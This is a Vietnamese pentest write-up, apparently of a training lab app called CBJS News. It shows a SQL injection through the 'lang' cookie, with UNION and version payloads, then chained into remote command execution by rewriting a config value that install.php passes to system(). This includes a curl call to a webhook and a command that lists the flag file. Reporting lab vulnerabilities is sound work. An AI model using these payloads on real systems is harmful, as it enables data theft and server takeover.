---
layout: post
title:  "Report CBJS News"
date:   2025-05-09 15:15:00 +0700
tags: Report CBJS
categories: jekyll update
---

# I. Tổng quan 
## 1. Mục tiêu
Báo cáo này nhằm liệt kê các lỗ hổng bảo mật và các vấn đề liên quan được phát hiện trong quá trình kiểm thử ứng dụng ```CBJS News```
## 2. Đối tượng 
Các mục tiêu kiểm thử bao gồm: 
- ```http://news-chain.cyberjutsu-lab.tech:5600/```
## 3. Phạm vi 
Phạm vi kiểm thử bao gồm toàn bộ chức năng của ứng dụng CBJS News, được triển khai trên đối tượng. 

Quá trình kiểm thử được thực hiện trên môi trường Cyberjutsu Academy cung cấp, không gây ảnh hưởng đến hệ thống thực tế. Phương pháp kiểm thử áp dụng là White-box. Các công cụ và kỹ thuật kiểm thử tuân thủ quy định của bài kiểm tra, đảm bảo tính hợp pháp và an toàn. Ứng dụng không được gắn với phiên bản cụ thể nào trong quá trình kiểm thử.

## 4. Quy ước đặt mã lỗ hổng
Các lỗ hổng được phát hiện trong quá trình kiểm thử sẽ được đặt theo quy ước sau:
- **CBJS-[Số thứ tự]**: Lỗ hổng trên ```http://news-chain.cyberjutsu-lab.tech:5600/``` (CBJS News)

Số thứ tự được đánh tăng dần theo thứ tự liên quan của các lỗ hổng, dựa trên luồng khai thác thực tế. 

## 5. Bảng tổng hợp các lỗ hổng
![image](https://hackmd.io/_uploads/BySK-iixxg.png)

# II. Chi tiết các lỗ hổng bảo mật
## 1. CBJS-01: SQL Injection at `lang` parameter in cookie field lead to dump data.  [<span style="color:#F39C12">High</span>]
### Description and Impact 
Tại website ```http://news-chain.cyberjutsu-lab.tech:5600/```, là một trang web tin tức và cho phép thay đổi ngôn ngữ giữa tiếng anh và tiếng việt.
Nhưng do lập trình đã không có các biện pháp chặt chẽ khi truyền dữ liệu vào trong tham số ```lang``` được lưu trong trường `cookie`. Và `unstrusted data` rơi vào trong câu `query` đã gây nên lỗ hổng từ đây có khiến cho các attacker có thể lấy được các dữ liệu nhạy cảm của người dùng.

### Root Cause Analysis 

Lỗ hổng SQL Injection xảy ra do lập trình viên không áp dụng các biện pháp bảo vệ khi xử lý dữ liệu đầu vào từ tham số `lang` trong phương thức `GET` trong file `index.php` và sau đó được vào trong trường `cookie`. Câu truy vấn SQL được xây dựng bằng cách nối chuỗi trực tiếp với giá trị của biến `lang` truyền vào mà người dùng có thể kiểm soát, dẫn đến việc kẻ tấn công có thể chèn mã SQL tùy ý vào truy vấn.

![image](https://hackmd.io/_uploads/BJet2toelx.png)
<p style="text-align:center;"><em>File index.php</em></p>

Ở dòng 13-16, kiểm tra có tham số `lang` có trên `URL` ko bằng method `GET`, nếu có thì thực hiện gán biến `$language` bằng giá trị của biến `lang`, rồi đó gán giá trị của biến `language` vào trường `cookie`.

Ở dòng 20-21, thực hiện kiểm tra nếu chưa có `cookie` thì gán biến giá trị biến `language` vào trong `lang` trong trường `cookie`.

Sau đó thực hiện câu lệnh SQL ở dòng 25, vì biến `language` được truyền trực tiếp không có kiểm soát bảo mật từ đây gây ra lỗi SQLi.

### Step to reproduce 
Quan sát cú request trong BurpSuite.

![image](https://hackmd.io/_uploads/S1CE1ciegl.png)

Tiếp tục gửi sang Repeater để có thể bắt đầu chỉnh sửa.

Do câu `query` được viết theo dạng truyền trực tiếp và được đóng lại bởi dấu nhép đơn. Nên mình sẽ thử payload là `'` đầu tiên.

![image](https://hackmd.io/_uploads/r1Ayx5ilgx.png)

Nó hiển thị ra lỗi do syntax từ đây là dấu hiệu chắc chắn của SQLi. Và đồng thời mình biết được cơ sỡ dữ liệu web dùng là **Postgresql** thông lỗi cú pháp trả về `pg_query`

Tiếp tục chèn payload để xác định số cột và câu `query SELECT` đến để thực hiện `UNION SELECT` thì hai phải cân bằng về số cột.
>' ORDER BY 4---- -

Dùng `ORDER BY 4` để sắp xếp nếu đúng hoặc thấp hơn thì không cho ra lỗi còn nếu nhiều hơn thì sẽ ra lỗi. Còn `-- -` là để comment lại tất cả phía sau của câu `query`.

![image](https://hackmd.io/_uploads/H1tUb5sgex.png)

Khi `ORDER BY 5-- -` thì ra lỗi nên số cột là 4.

Mình tiếp tục chèn payload để xác định vị trí nào có thể in ra được dữ liệu.
>' UNION SELECT 1,'a','b','c'---- -

![image](https://hackmd.io/_uploads/H1cbMcoexg.png)
Thì mình thấy do query ra được chữ `a` hiển thị ra, thì đây là nơi mà dữ liệu của mình khi thực hiện sẽ có thể in ra được.

Tiếp theo là cần xác định được version của database hiện đang dùng từ đây có thể tìm ra được nhiều lỗi không bị sót. 
>' UNION SELECT 1,version(),'b','c'---- -

![image](https://hackmd.io/_uploads/BJMDmcoxll.png)

Sau đó mình tiếp tục xác định tên database hiện web đang dùng.

![image](https://hackmd.io/_uploads/rkEVO5oeex.png)

Từ đây thì attacker đã có thể thực hiện dump database thành công. 

### Recommendations 
Để khắc phục lỗ hổng SQLi này thì nên có các biện pháp chặn chặt chẽ từ câu query như dùng ```Prepare Statements``` hoặc trước khi truyền data vào tham số `lang` thì nên validate hợp lí.

### References 
- BurpSuite 

## 2. CBJS-02: SQL Injection at `lang` in cookie lead to RCE via Privilege Escalation through `install.php` file [<span style="color:#E74C3C">Critical</span>]

### Description and Impact 

Khi kiểm tra toàn bộ source code của ứng dụng thì có file `install.php` lại có 1 `sink` là `system()` nguy hiểm và attacker có thể liên kết hình thành một exploit chain từ SQLi dẫn đến RCE thông qua SQLi này.

### Root Cause Analysis

![image](https://hackmd.io/_uploads/rJeXUcslex.png)
<p style="text-align:center;"><em>File install.php</em></p>

Ở dòng 9-11, câu query được truy vấn để lấy cột `value` từ table `configs` có dòng `name` là `install_script`. Sau đó được gán vào biến `install_script` với đúng giá trị được lấy ra từ table `configs`.

Và cuối cùng là được sink `system()` thực hiện. 

Từ đây thì attacker có thể lợi dụng lỗi SQLi để có thể `UPDATE` lại giá trị của cột `value` thành 1 giá trị `shell` để có thể thực RCE.

### Step to reproduce 
Mình truyền câu query để `UPDATE` lại giá trị cột `value` thành URL `webhook` có chứa `payload` là `curl <url_webhook>`

![image](https://hackmd.io/_uploads/Bynu9cille.png)
Webhook ban đầu không có request nào.

Sau đó mình chèn payload sau: 
> '; UPDATE configs SET value='curl <your_url_webhook>' WHERE name='install_script'---- -

![image](https://hackmd.io/_uploads/HJm2a5jelg.png)

Sau khi chạy xong mình truy cập vào endpoint `/install.php`

![image](https://hackmd.io/_uploads/ByLAp5ilxg.png)
Từ đây mình thấy là nó đã thực hiện 1 cú `request` tới webhook nghĩa là đã thực hiện hàm `system()`

Tiếp theo mình thay đổi payload để có thể RCE hoàn hảo hơn.
>'; UPDATE configs SET value='ls -lia / | grep flag' WHERE name='install_script'-- -

![image](https://hackmd.io/_uploads/ryVEyiolxg.png)

![image](https://hackmd.io/_uploads/H1p_1ojllg.png)

Sau đó mình có thể đọc file bí mật

![image](https://hackmd.io/_uploads/Skmjksiege.png)

![image](https://hackmd.io/_uploads/r1Z2yjoxlx.png)


### Recommendations 
- Tránh thực thi trực tiếp giá trị từ database bằng system() hoặc các hàm thực thi shell khác.
- Không dùng pg_query() với dữ liệu không kiểm soát. Thay vào đó, sử dụng prepared statements (pg_prepare, pg_execute) hoặc PDO với binding.
- Giới hạn quyền tài khoản PostgreSQL chỉ với SELECT nếu không cần cập nhật.
- Thực thi lệnh hệ thống chỉ nên chọn từ danh sách cố định (allowlist) các script hợp lệ.
- Nếu vẫn cần thực thi shell, hãy chạy trong môi trường sandbox hoặc giới hạn quyền hệ thống (non-root user, chroot, container).
- Ghi log và giám sát mọi thay đổi bất thường vào bảng configs và hành vi thực thi lệnh trên hệ thống.
    
### References 
- BurpSuite 

# III. Kết luận
Quá trình phân tích bảo mật đã phát hiện ra lỗ hổng nghiêm trọng trong ứng dụng. Lỗ hổng này xuất phát từ việc thiếu kiểm soát đầu vào, xử lý dữ liệu không an toàn,
và không áp dụng các biện pháp xác thực. Tác động tiềm tàng bao gồm lộ dữ liệu người dùng, leo thang đặc quyền, và kiểm soát máy chủ, đe dọa nghiêm trọng đến tính bảo mật và toàn vẹn của hệ thống.
<p style="text-align: right;">Trân trọng, h4gphwc</p>

